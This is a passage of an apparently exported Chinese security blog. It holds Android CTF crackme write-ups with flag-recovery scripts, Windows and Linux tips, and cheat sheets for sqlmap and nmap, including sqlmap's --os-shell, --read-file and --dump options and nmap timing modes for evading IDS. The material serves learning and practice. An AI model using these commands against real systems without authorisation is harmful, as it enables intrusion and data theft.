    <content type="text"><![CDATA[0x01 题目描述无 0x02 题解首先下载到一个apk文件，用模拟器安装一下，看看什么功能，如下 是一个要求输入正确key的程序。 用JEB打开，反汇编查看java源代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.example.findpass;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.text.TextUtils;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.widget.Toast;import java.io.InputStreamReader;public class MainActivity extends Activity &#123; public MainActivity() &#123; super(); &#125; public void GetKey(View arg16) &#123; String v5 = this.findViewById(2131230721).getText().toString(); if(TextUtils.isEmpty(v5.trim())) &#123; goto label_57; &#125; char[] v4 = this.getResources().getString(2131034115).toCharArray(); int v2 = v4.length; char[] v1 = new char[1024]; try &#123; new InputStreamReader(this.getResources().getAssets().open(&quot;src.jpg&quot;)).read(v1); &#125; catch(Exception v3) &#123; v3.printStackTrace(); &#125; int v6; for(v6 = 0; v6 &lt; v2; ++v6) &#123; int v12 = v1[v4[v6]] % 10; v4[v6] = v6 % 2 == 1 ? ((char)(v4[v6] + v12)) : ((char)(v4[v6] - v12)); &#125; if(v5.equals(new String(v4))) &#123; Toast.makeText(((Context)this), &quot;恭喜您，输入正确！Flag==flag&#123;Key&#125;&quot;, 1).show(); &#125; else &#123; Toast.makeText(((Context)this), &quot;not right! lol。。。。&quot;, 1).show(); return; label_57: Toast.makeText(((Context)this), &quot;请输入key值！&quot;, 1).show(); &#125; &#125; protected void onCreate(Bundle arg2) &#123; super.onCreate(arg2); this.setContentView(2130903040); &#125; public boolean onCreateOptionsMenu(Menu arg3) &#123; this.getMenuInflater().inflate(2131165184, arg3); return 1; &#125; public boolean onOptionsItemSelected(MenuItem arg3) &#123; boolean v1 = arg3.getItemId() == 2131230723 ? true : super.onOptionsItemSelected(arg3); return v1; &#125;&#125; 定位到关键位置123if(v5.equals(new String(v4))) &#123; Toast.makeText(((Context)this), &quot;恭喜您，输入正确！Flag==flag&#123;Key&#125;&quot;, 1).show(); &#125; 当v5等于v4的时候，就是正确的，这里v5是我们输入的值，而v4的话，我们向上看首先1char[] v4 = this.getResources().getString(2131034115).toCharArray(); v4是从控件中获取到的值，然后到下面12345int v6;for(v6 = 0; v6 &lt; v2; ++v6) &#123; int v12 = v1[v4[v6]] % 10; v4[v6] = v6 % 2 == 1 ? ((char)(v4[v6] + v12)) : ((char)(v4[v6] - v12));&#125; 进行一系列的变换后得到最终值，那么就是说，我们可以通过动态调试获取到最后v4变换的值，而那个就是我们需要的key！！ 动态调试的话首先我们需要在apk中的AndoridMainifest.xml文件中，在application标签中添加1android:debuggable=&quot;true&quot; 然后重新编译打包成apk，这些步骤可以用AndroidKiller来轻松搞定，然后，用安卓逆向助手将class.dex文件提取出来，IDA打开！（在用IDA加载之前记得用Andorid stutio模拟器安装apk！）在右侧的Function Window中用Ctrl+F快速定位到GetKey函数，我们可以在 此处下个断点，然后在查看变量列表中的值即可。 在菜单栏中选择Debugger -》Debugger options勾选Suspend on process entry point并在下面点击Set specific options，填写Package name和Activity，这些信息在AndroidMainifest.xml中都有显示 然后选择Debugger -》Debugger windows-》locals 按F9开始运行 此时可以点击中间的suspend按钮暂停，然后选择Debugger -》Debugger windows-》Locals，将Local列表拖出来方便观察 之后点击IDA左上角的绿色三角符号开始，在模拟器中输入任意字符串，看到v4的值就是正确的key了！ 我们将这个字符串输入到程序中来验证一番 正确！]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[61dctf - androideasy]]></title>
    <url>%2F2018%2F06%2F10%2F61dctf-androideasy%2F</url>
    <content type="text"><![CDATA[0x01 题目描述无 0x02 题解这道题也是个apk，很尴尬的是我安装不上，不知道究竟是为什么。。那直接拖进jeb看看能否反汇编 成功反汇编成java代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.a.sample.androidtest;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity &#123; private EditText editText; private byte[] s; public MainActivity() &#123; super(); this.s = new byte[]&#123;113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106&#125;; &#125; public boolean check() &#123; boolean v2 = false; byte[] v0 = this.editText.getText().toString().getBytes(); if(v0.length == this.s.length) &#123; int v1 = 0; while(v1 &lt; this.s.length) &#123; if(v1 &gt;= v0.length) &#123; break; &#125; if(this.s[v1] == (v0[v1] ^ 23)) &#123; ++v1; continue; &#125; else &#123; return v2; &#125; &#125; v2 = true; &#125; return v2; &#125; protected void onCreate(Bundle arg4) &#123; super.onCreate(arg4); this.setContentView(2130968603); this.editText = this.findViewById(2131427415); this.findViewById(2131427416).setOnClickListener(new View$OnClickListener(this) &#123; public void onClick(View arg4) &#123; if(MainActivity.this.check()) &#123; Toast.makeText(this.val$context, &quot;You got the flag!&quot;, 1).show(); &#125; else &#123; Toast.makeText(this.val$context, &quot;Sorry your flag is wrong&quot;, 1).show(); &#125; &#125; &#125;); &#125;&#125; 可以看到当check返回true的话就会得到flag了。那就看check函数，如果我们输入的字符串的每一位都与23异或后的结果等于s数组中对应的值，那么在全部完成31次后check函数就会返回true那么很容易逆过来，脚本如下123456789s = [113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106]result = &apos;&apos;for i in range(len(s)): result += chr(int(s[i]) ^ 23)print result]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DD Android Normal]]></title>
    <url>%2F2018%2F06%2F10%2FDD-Android-Normal%2F</url>
    <content type="text"><![CDATA[0x01 题目描述提交下一关的邮箱地址。 解压密码 infected。 0x02 题解这道题下载的是一个zip文件，用题目给的压缩密码解压，得到一个apk和一个readme.txt readme.txt如下： 12345赛题背景：本挑战结合了Android, Java, C/C++，加密算法等知识点，考察了挑战者的binary逆向技术和加密算法能力。赛题描述：本题是一个app，请试分析app中隐藏的key，逆向加密算法并得到对应的秘钥。可以在app中尝试输入key，如果正确会显示“correct”，如果错误会显示“Wrong”。提 示：阅读assembly code，理解xor的加密逻辑和参数，解出答案。评分标准：key正确则可进入下一题。 按照描述，将apk送入jeb尝试反汇编 1234567891011121314151617181920212223242526272829303132333435363738package com.didictf.hellolibs;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; private TextView mFlagEntryView; private TextView mFlagResultView; static &#123; System.loadLibrary(&quot;hello-libs&quot;); &#125; public MainActivity() &#123; super(); &#125; public void onClickTest(View arg3) &#123; if(this.mFlagEntryView.getText().toString().equals(this.stringFromJNI())) &#123; this.mFlagResultView.setText(&quot;Correct&quot;); &#125; else &#123; this.mFlagResultView.setText(&quot;Wrong&quot;); &#125; &#125; protected void onCreate(Bundle arg2) &#123; super.onCreate(arg2); this.setContentView(2130968602); this.mFlagEntryView = this.findViewById(2131427413); this.mFlagResultView = this.findViewById(2131427415); &#125; public native String stringFromJNI() &#123; &#125;&#125; 代码没什么用，看到最后的方法有一个native关键字，知道这个是JNI，因此得调试.so文件，看到上面程序也调用了hellolibs，那么我们将hellolibs.so提取出来 用IDA打开.so文件，发现在HEX View中直接有flag。。]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DD Android Easy]]></title>
    <url>%2F2018%2F06%2F10%2FDD-Android-Easy%2F</url>
    <content type="text"><![CDATA[0x01 题目描述无 0x02 题解下载的是一个apk文件，安装到模拟器发显示一个猜密码程序 送入jeb尝试反汇编，成功反汇编成java代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.didi_ctf.flagapp;import android.os.Bundle;import android.support.v7.a.d;import android.view.View;import android.widget.TextView;public class FlagActivity extends d &#123; private static String m; private TextView n; private TextView o; private static final byte[] p; private static final byte[] q; static &#123; FlagActivity.m = &quot;com.didi_ctf.flagapp.FlagActivity&quot;; FlagActivity.p = new byte[]&#123;-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101&#125;; FlagActivity.q = new byte[]&#123;-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37, -128, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24&#125;; &#125; public FlagActivity() &#123; super(); &#125; private String i() &#123; int v1 = 0; byte[] v2 = new byte[FlagActivity.p.length]; int v0; for(v0 = 0; v0 &lt; v2.length; ++v0) &#123; v2[v0] = ((byte)(FlagActivity.p[v0] ^ FlagActivity.q[v0])); &#125; int v3 = v2[0]; for(v0 = 0; v2[v3 + v0] != 0; ++v0) &#123; &#125; byte[] v4 = new byte[v0]; while(v1 &lt; v0) &#123; v4[v1] = v2[v3 + v1]; ++v1; &#125; return new String(v4); &#125; public void onClickTest(View arg3) &#123; if(this.n.getText().toString().equals(this.i())) &#123; this.o.setText(2131099685); &#125; else &#123; this.o.setText(2131099683); &#125; &#125; protected void onCreate(Bundle arg2) &#123; super.onCreate(arg2); this.setContentView(2130968602); this.n = this.findViewById(2131427413); this.o = this.findViewById(2131427415); &#125;&#125; 针对算法写出脚本，得到flag1234567891011121314151617181920212223242526272829p = [-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101]q = [-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37, -128, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24]m = []j = 0n = 0flag = &quot;&quot;k = int(p[0]) ^ int(q[0])for i in range(len(p)): m.append(int(p[i] ^ q[i]))while True: if int(m[k+j]) == 0: count = j break j += 1while n &lt; count: flag += chr(m[k + n]) n += 1print flag]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用WINDOWS的DOC命令]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%B8%B8%E7%94%A8WINDOWS%E7%9A%84DOC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x01 文件夹管理 cd 显示当前目录名或改变当前目录。 md 创建目录。 rd 删除一个目录。 dir 显示目录中的文件和子目录列表。 tree 以图形显示驱动器或路径的文件夹结构。 path 为可执行文件显示或设置一个搜索路径。 xcopy 复制文件和目录树。 0x02 文件管理 type 显示文本文件的内容。 more 以翻页的模式显示文本内容 copy 将一份或多份文件复制到另一个位置。 del 删除一个或数个文件。 move 移动文件并重命名文件和目录。(Windows XP Home Edition中没有) ren 重命名文件。 replace 替换文件。 attrib 显示或更改文件属性。 find 搜索字符串。 fc 比较两个文件或两个文件集并显示它们之间的不同 0x03 网络命令 ping 进行网络连接测试、名称解析 ftp 文件传输 net 网络命令集及用户管理 telnet 远程登陆 ipconfig显示、修改TCP/IP设置 arp 显示、修改局域网的IP地址-物理地址映射列表 0x04 系统管理 shutdown立即或定时关机或重启 tskill 结束进程 taskkill结束进程(比tskill高级，但WinXPHome版中无该命令) tasklist显示进程列表(Windows XP Home Edition中没有) sc 系统服务设置与控制 reg 注册表控制台工具 powercfg控制系统上的电源设置 netsh firewall set opmode mode=enable/disable 开启或关闭防火墙]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
        <tag>DOC命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的SQLMAP命令]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%B8%B8%E7%94%A8%E7%9A%84SQLMAP%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x01 总结sqlmap -u 网址sqlmap –dbs 列出所有数据库sqlmap –current-db 列出当前数据库sqlmap –tables 列出当前的表sqlmap –columns 列出当前的列sqlmap -D 选择使用哪个数据库sqlmap -T 选择使用哪个表sqlmap -C 选择使用哪个列sqlmap –dump 获取字段中的数据sqlmap –forms 尝试使用post注入sqlmap -r 加载文件中的HTTP请求，针对http头注入时最为有效sqlmap -g 利用google-hacking的语法进行自动化扫描是否有注入sqlmap –tamper “unmagicquotes.py” 利用脚本进行宽字节注入sqlmap –force-ssl 强制使用sslsqlmap –prefix 指定payload前缀sqlmap –suffix 指定payload后缀sqlmap -v 3 指定sqlmap的paylpoadsqlmap –technique=U/B/T/S 指定注入点类型 （union/boolean/time/stack）sqlmap –is-dba 查看是否是adminsqlmap –random-agent 构造随机的user-agentsqlmap –delay 设置多久访问一次sqlmap –os-shell 获取主机shell，一般不太好用，因为没权限sqlmap –read-file 读取制定文件]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
        <tag>SQLMAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的NMAP命令总结]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%B8%B8%E8%A7%81%E7%9A%84NMAP%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x01 概述总结了一下常见的NMAP的使用命令，用来快速查看的，觉得有用的小伙伴可以收藏一下。 0x02 总结nmap -v 详细信息输出nmap -p 指定端口nmap -iL 扫描文件中的ipnmap -exclude 不扫描某些ipnmap -Pn 使用ping扫描，显式地关闭端口扫描，用于主机发现nmap -sn 使用ping扫描，进行端口扫描，假设主机都是up的nmap -sS 使用SYN扫描，不需要完成三次握手nmap -sT TCP connect扫描，需要完成三次握手，只适用于找出TCP和UDP端口nmap -sU 扫描UDP端口nmap -sF FIN扫描，用于探测防火墙状态，识别端口是否关闭，容易漏扫nmap -sV 扫描目标主机的端口和软件版本nmap -O 远程检测操作系统和软件nmap -O –osscan-guess 猜测目标操作系统版本nmap -traceroute 路由跟踪nmap -A 综合扫描，包含1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测nmap -oN result.txt 将标准输出写入到指定文件中nmap -oX result.xml 将输入写成xml的形式nmap -oS result.txt 将输出写成特殊符号的形式，内容跟-oN是一样的，只是字体变了而已nmap -oG result.txt 将输出写成特殊格式nmap -oA 将输出所有格式，有三种 .xml/ .gnmap/ .nmapnmap -T[0-5] 时间参数模板&nbsp;&nbsp;-T0 用于躲避IDS，时间很长&nbsp;&nbsp;-T1 用于躲避IDS，时间很长&nbsp;&nbsp;-T2 降低了扫描速度，使用更小的带宽和目标主机资源对目标靶机进行扫描&nbsp;&nbsp;-T3 默认模式，未做优化&nbsp;&nbsp;-T4 假设用户具有合适及可靠的网络而加速对目标靶机的扫描&nbsp;&nbsp;-T5 假设用户具有更好的网络或者愿意牺牲准确性而加速扫描nmap -sC 根据端口识别服务自动调用默认脚本nmap –script]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
        <tag>NMAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS劫持与DNS污染]]></title>
    <url>%2F2018%2F06%2F10%2FDNS%E5%8A%AB%E6%8C%81%E4%B8%8EDNS%E6%B1%A1%E6%9F%93%2F</url>
    <content type="text"><![CDATA[0x01 DNS什么是DNS呢？DNS全称“Domain Name Server”，中文域名服务，通常我们会叫它域名解析协议。那么DNS用来干什么的呢？正如它的名字一样，用来解析域名的。我们平时访问一个网页，例如百度，我们会在地址栏中输入www.baidu.com，这个就是域名，但是对于计算机来说，它们工作的时候用的是ip地址，ip地址简单的说就是一串很长的数字，那么对于人来说很难记住，为了方便记住网址，域名就由此而来了。而DNS就是把域名转换为ip地址的一种服务也好，协议也罢，大概就是那种概念吧。 0x02 DNS工作流程DNS的工作流程是怎样的呢？ 当我们在地址栏中输入一个网址，并按下回车，域名解析的过程就开始了 计算机首先会在查找本地的HOSTS文件，如果有的话，就直接引用HOSTS文件中的域名对应的ip地址，那么本次域名解析的过程就结束了。 但是如果本地的HOSTS文件里没有对应的ip地址，那么就会看你的计算机有没有设置DNS服务器，如果没有设置，那么就没办法了，浏览器会报错，说网站的域名无法解析，本次解析过程就结束了。 如果设置了DNS服务器，那么计算机就会那着我们输入的网址到那个DNS服务器去查找，如果去查找的DNS服务器的过程中有服务器挂掉了，那么还是没办法，浏览器还是会报错。 如果没有错误，正常查询到了对应的ip，那么浏览器就会拿着这个ip地址来访问正常的web服务，本次解析过程结束。 0x03 DNS劫持通过上面说的过程，我们知道，一个域名解析的过程就是送计算机得到域名到远端的DNS服务器把结果给我们返回过来，因此这个过程如果有一个中间人，他截获了我们的DNS请求，然后返回一个恶意的ip地址给我们，那么我们的计算机就会把这个恶意的ip地址当作我们想要访问的域名的对应ip，那么每次我们想访问这个网站的时候就会访问那个恶意的ip，如果那个中间人制作了一个和我们想要访问的网址一样的前端界面，就很有可能完成一次钓鱼攻击。 0x04 DNS污染DNS污染通常还有说法叫做DNS投毒之类的，就是DNS查询的这个过程里，如果有人在你查询结果返回给你之前先一步将一个错误的ip给你，那么真正的查询结果返回的时候就会被忽略，那么你永远只能使用那个错误的ip来进行访问了，GFW的原理就是这个。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos安装nc]]></title>
    <url>%2F2018%2F06%2F10%2Fcentos%E5%AE%89%E8%A3%85nc%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gztar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd /usr/localmv netcat-0.7.1 netcatcd /usr/local/netcat./configuremake &amp;&amp; make install配置文件vim /etc/profile添加以下内容：export NETCAT_HOME=/usr/local/netcatexport PATH=$PATH:$NETCAT_HOME/bin保存，退出，并使配置生效：source /etc/profile]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>小贴士</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH免密码登陆]]></title>
    <url>%2F2018%2F06%2F10%2FSSH%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[首先生成自己的密钥对1ssh-keygen -t rsa 根据默认的位置应该在/home/.ssh/目录下 我使用的方法是ssh-copy-id 1ssh-copy-id -i ~/.ssh.id_rsa.pub &lt;登陆名&gt;@&lt;远程ip&gt; -p &lt;端口号&gt; 注意在这一步的时候会让你设置passphare，直接回车就好了，不然还是需要密码的。 然后使用1ssh &lt;登陆名&gt;@&lt;远程ip&gt; -p &lt;端口号&gt; 就可以直接登陆了。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>小贴士</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下PPPOE拨号]]></title>
    <url>%2F2018%2F06%2F10%2FLinux%E4%B8%8BPPPOE%E6%8B%A8%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[打开终端 1sudo pppoeconf 按照提示进行填写用户名和密码 建立连接 1sudo pon dsl-provider 断开连接 1sudo poff dsl-provider]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>小贴士</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下开机自动挂载硬盘]]></title>
    <url>%2F2018%2F06%2F10%2FLinux%E4%B8%8B%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BD%E7%A1%AC%E7%9B%98%2F</url>
    <content type="text"><![CDATA[首先cd到需要挂在的硬盘目录去，如果该硬盘的名字是中文的话，一般最后一级的目录名是一个很长的字母加数字的字符串，如果是英文的则就是那个英文名字，这个为该硬盘的UUID 查看 1sudo blkid 查看文件系统类型，一般是ntfs 编辑sudo gedit /etc/fstab UUID=(写那个UUID) (硬盘的绝对路径) ntfs default 0 0]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>小贴士</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装ubuntu16.04之后要做的事]]></title>
    <url>%2F2018%2F06%2F10%2F%E5%AE%89%E8%A3%85ubuntu16-04%E4%B9%8B%E5%90%8E%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[0x01 写在前面从用上linux到现在也有个小半年了，总是因为各种原因重装系统了五六次，每次安装完之后都要上网查重装系统要做的事，很麻烦，恰逢最近又重装了系统，记录一下我的安装之路。 0x02安装ubuntu16.04之后要做的事 更换源 采用了阿里源1sudo gedit /etc/apt/sources.list 将内容替换成12345678910deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse 然后保存退出1source /etc/apt/sources.list 然后更新一下1sudo apt-get update 删除不常用的软件 123sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot sudo apt-get remove gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku landscape-client-ui-install sudo apt-get remove onboard deja-dup 删除Amazon链接1sudo apt-get remove unity-webapps-common 卸载libreOfficelibreoffice是ubuntu自带的开源office软件，体验效果不如windows上的office，可以用WPS代替。1sudo apt-get remove libreoffice-common 安装搜狗输入法 安装之前要把Fictx卸载1sudo apt remove fcitx* &amp;&amp; sudo apt autoremove 到官网下载搜狗输入法linux版本，下载后直接双击install即可 安装显卡驱动 我的显卡是GTX1060，具体的可以自己查找属于自己显卡的驱动型号12345sudo add-apt-repository ppa:graphics-drivers/ppa(好像不添加公钥也可以安装成功...)sudo apt-get updatesudo apt-get install nvidia-367sudo apt-get install mesa-common-devsudo apt-get install freeglut3-dev 主题美化 （这次重装之后发现主题美化是真的好看…）首先，安装Unity Tweak Tool1sudo apt-get install unity-tweak-tool 然后安装Flatabulous主题123sudo add-apt-repository ppa:noobslab/themessudo apt-get updatesudo apt-get install flatabulous-theme 再安装一下该主题的配套图标123sudo add-apt-repository ppa:noobslab/iconssudo apt-get updatesudo apt-get install ultra-flat-icons 安装好了之后，打开unity-tweak-tool，选择主题,修改为Flatabulous；打开图标栏,修改为Ultra-flat；打开面板,调整顶部菜单栏的透明度 安装vim 1sudo apt-get install vim 安装Sublime Text 3 123sudo add-apt-repository ppa:webupd8team/sublime-text-3 sudo apt-get update sudo apt-get install sublime-text 下面安装插件进入https://packagecontrol.io/installation，选择sublime text 3版本的内容，复制。打开sublime，ctrl + `，粘贴之后回车运行即可。 接下来我们安装Material Theme主题按ctrl+shift+p打开指令面板，在输入框输入install package后按Enter键，然后搜索”Material Theme”后按Enter键安装。 由于Sublime Text 3默认不支持中文编码，我们还要用上面相同的方式安装一下ConvertToUTF8插件 解决中文输入法问题，参考：http://blog.csdn.net/terence1212/article/details/51803123 安装java 首先下载jdkhttp://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 下载好了之后新建目录：1sudo mkdir /usr/lib/jvm 然后将下载的jdk移动至该目录，并解压123sudo cp jdk-8u131-linux-x64.tar.gz /usr/lib/jvm/cd /usr/lib/jvm/sudo tar -zxvf jdk-8u131-linux-x64.tar.gz 然后配置环境变量1sudo gedit /etc/profile 文件末尾加入：1234export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_131export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 文件生效1source /etc/profile 检查配置是否成功：1java -version 安装字典 我选择的是Goldendict，在github找到了一个配置教程感觉很不错。https://github.com/yanyingwang/goldendict 安装截图工具 shutter123sudo add-apt-repository ppa:shutter/ppasudo apt updatesudo apt install shutter 0x03 参考http://www.fant0m.com/18.htmlhttps://github.com/yanyingwang/goldendict]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>小贴士</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu16.04修改成静态IP]]></title>
    <url>%2F2018%2F06%2F10%2Fubuntu16-04%E4%BF%AE%E6%94%B9%E6%88%90%E9%9D%99%E6%80%81IP%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122ifconfig获取本地网络名称sudo vim /etc/network/interfaces添加如下：auto ens33(本地网络名称)iface ens33 inet staticaddress xxx.xxx.xxx.xxx (想要设置的ip)gateway xxx.xxx.xxx.xxx (默认网关)netmask xxx.xxx.xxx.xxx (掩码)刷新ipsudo ip addr flush ens33sudo systemctl restart networking.service sudo vim /etc/NetworkManager/NerworkManager.conf将里面的managed设置为truesudo service network-manager restart重启服务]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>小贴士</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xshell 5 不能使用退格键和Delete建]]></title>
    <url>%2F2018%2F06%2F10%2Fxshell5%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E9%80%80%E6%A0%BC%E9%94%AE%E5%92%8CDelete%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[0x01 问题安装完在使用的过程中发现不能使用退格键和delete键 0x02 解决方案文件 -》 打开 -》属性 -》 在终端找键盘选项 按照图片设置即可啦]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>小贴士</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ZZCMS V8.2 SQL注入]]></title>
    <url>%2F2018%2F06%2F10%2FZZCMSV8-2SQL%E6%B3%A8%E5%85%A5%2F</url>
